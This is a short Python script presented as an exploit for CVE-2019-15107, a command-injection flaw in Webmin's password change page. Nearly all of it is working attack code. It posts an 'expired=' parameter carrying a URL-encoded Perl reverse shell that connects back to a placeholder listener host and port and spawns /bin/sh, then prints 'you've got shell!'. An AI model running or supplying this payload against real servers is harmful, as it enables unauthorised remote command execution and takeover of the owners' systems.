# Python exploit for CVE-2019-15107


import argparse
import urllib.request, urllib.parse

parser = argparse.ArgumentParser(description="Python exploit for CVE-2019-15107",
                                 usage=''' python3 CVE-2019-15107.py <target> [option]

	Example: python3 CVE-2019-15107.py -t http://10.15.1.1 -p 10000''',
                                 formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-t',
                    '--target',
                    type=str,
                    required=True,
                    help='http://<ip> or https://<ip>')
parser.add_argument('-p',
                    '--port',
                    type=str,
                    required=False,
                    default=10000,
                    help="default port 10000")

args = parser.parse_args()
host = args.target + ":" + str(args.port)
url = host + "/password_change.cgi"
referer = host + "/session_login.cgi"
magic_word = "expired="
shell_perl = """perl+-e+'use+Socket%3b$i%3d"<LHOST>"%3b$p%3d<LPORT>%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">%26S")%3bopen(STDOUT,">%26S")%3bopen(STDERR,">%26S")%3bexec("/bin/sh+-i")%3b}%3b'"""
payload = magic_word + shell_perl
req = urllib.request.Request(url)
req.add_header('Referer', referer)
req.data = payload.encode('UTF-8')
print("you've got shell!")
response = urllib.request.urlopen(req)
